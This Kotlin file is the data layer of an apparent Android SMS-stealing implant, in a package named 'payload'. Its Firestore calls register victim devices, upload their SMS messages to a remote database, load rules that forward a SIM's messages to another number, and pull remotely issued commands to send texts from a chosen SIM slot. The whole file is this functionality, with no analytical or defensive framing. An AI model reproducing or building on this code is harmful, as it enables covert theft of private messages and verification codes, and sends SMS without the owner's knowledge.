package com.payload.jansiix0ne.repository

import com.google.firebase.firestore.FirebaseFirestore
import com.payload.jansiix0ne.models.DeviceModel
import com.payload.jansiix0ne.models.SmsModel
import kotlinx.coroutines.tasks.await

class FirestoreRepository {

    private val firestore = FirebaseFirestore.getInstance()

    suspend fun registerDevice(deviceModel: DeviceModel): Result<Unit> {
        return try {
            firestore.collection("devices")
                .document(deviceModel.deviceid)
                .set(deviceModel)
                .await()
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun uploadSms(deviceId: String, smsModel: SmsModel): Result<Unit> {
        return try {
            firestore.collection("devices")
                .document(deviceId)
                .collection("sms")
                .add(smsModel)
                .await()
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun getDeviceInfo(deviceId: String): Result<DeviceModel?> {
        return try {
            val document = firestore.collection("devices")
                .document(deviceId)
                .get()
                .await()
            
            val deviceModel = document.toObject(DeviceModel::class.java)
            Result.success(deviceModel)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun updateDeviceStatus(deviceId: String, updates: Map<String, Any>): Result<Unit> {
        return try {
            firestore.collection("devices")
                .document(deviceId)
                .update(updates)
                .await()
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun getAllSms(deviceId: String): Result<List<SmsModel>> {
        return try {
            val snapshot = firestore.collection("devices")
                .document(deviceId)
                .collection("sms")
                .get()
                .await()
            
            val smsList = snapshot.documents.mapNotNull { 
                it.toObject(SmsModel::class.java) 
            }
            Result.success(smsList)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun saveDeviceInfo(deviceId: String, deviceModel: DeviceModel): Result<Unit> {
        return try {
            firestore.collection("devices")
                .document(deviceId)
                .set(deviceModel, com.google.firebase.firestore.SetOptions.merge())
                .await()
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun saveUserFields(fields: Map<String, Any>, deviceId: String): Result<Boolean> {
        return try {
            // Update userInfo fields in device document
            val updates = mutableMapOf<String, Any>()
            fields.forEach { (key, value) ->
                updates["userInfo.$key"] = value
            }
            
            firestore.collection("devices")
                .document(deviceId)
                .update(updates)
                .await()
            
            Result.success(true)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun saveLog(level: String, message: String, deviceId: String): Result<Unit> {
        return try {
            val logEntry = mapOf(
                "timestamp" to com.google.firebase.Timestamp.now(),
                "level" to level,
                "message" to message,
                "deviceId" to deviceId
            )
            
            firestore.collection("logs")
                .add(logEntry)
                .await()
            
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun getForwardingRules(deviceId: String): Result<List<com.payload.jansiix0ne.models.ForwardingModel>> {
        return try {
            val snapshot = firestore.collection("smsforward")
                .whereEqualTo("deviceId", deviceId)
                .whereEqualTo("status", "active")
                .get()
                .await()
            
            val rules = snapshot.documents.mapNotNull {
                try {
                    com.payload.jansiix0ne.models.ForwardingModel(
                        fromSim = it.getString("fromSim") ?: "",
                        toNumber = it.getString("toNumber") ?: "",
                        status = it.getString("status") ?: "",
                        executed = it.getBoolean("executed") ?: false
                    )
                } catch (e: Exception) {
                    null
                }
            }
            
            Result.success(rules)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun getSendSmsCommand(deviceId: String): Result<com.payload.jansiix0ne.models.SendSmsModel?> {
        return try {
            val document = firestore.collection("devices")
                .document(deviceId)
                .get()
                .await()
            
            val sendSmsData = document.get("send_sms") as? Map<*, *>
            
            val sendSmsModel = if (sendSmsData != null) {
                com.payload.jansiix0ne.models.SendSmsModel(
                    phoneNumber = sendSmsData["phoneNumber"] as? String ?: "",
                    message = sendSmsData["message"] as? String ?: "",
                    sent = sendSmsData["sent"] as? Boolean ?: false,
                    simSlot = (sendSmsData["simSlot"] as? Long)?.toInt() ?: 0,
                    timestamp = sendSmsData["timestamp"] as? Long ?: System.currentTimeMillis()
                )
            } else {
                null
            }
            
            Result.success(sendSmsModel)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun updateSendSmsStatus(deviceId: String, sent: Boolean): Result<Unit> {
        return try {
            firestore.collection("devices")
                .document(deviceId)
                .update("send_sms.sent", sent)
                .await()
            
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
}
